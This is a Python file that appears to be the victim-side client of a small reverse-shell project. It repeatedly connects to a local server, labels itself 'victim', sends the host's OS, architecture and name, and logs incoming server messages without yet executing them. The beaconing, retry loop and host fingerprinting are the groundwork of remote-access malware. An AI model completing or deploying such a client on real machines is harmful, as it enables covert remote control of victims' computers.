import socket
import reverse_shell.consts as ct
import reverse_shell.utils as ut
import platform
import time
import json
from sys import exit


def initiate():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    addr = ('localhost', ct.SERVER_PORT)
    sock.connect(addr)
    return sock


def send_computer_info(sock):
    my_system = platform.uname()
    os = my_system.system
    arch = my_system.machine
    computer_info = json.dumps({"os": os.lower(), "arch": arch.lower(), "name": my_system.node.lower()})  # Sterilize the computer info
    ut.send_message(computer_info, sock)


def send_verification(sock):
    ut.send_message("victim", sock)
    verification_message = ut.receive_message(sock)

    if verification_message == ct.UNVERIFIED_MESSAGE:
        ut.log("error", "Verification failed! exiting...")
        exit(1)

    else:
        ut.log("success", "Verification Succeeded!")


def connect_whatever():
    while True:
        try:
            sock = initiate()
            return sock
        except IOError:
            print("IOerror occurred restarting after 5s...")
            time.sleep(5)


def start():
    sock = connect_whatever()
    # Verifying the client
    send_verification(sock)

    # Sending computer information
    send_computer_info(sock)

    connected = True

    while connected:
        message = ut.receive_message(sock)

        if not message:
            connected = False
            continue

        if message == ct.DISCONNECT_MESSAGE:
            connected = False

        ut.log("message accepted", f"Server -> {message}")

    ut.log("disconnected", "Disconnected with the server.")


if __name__ == "__main__":
    start()
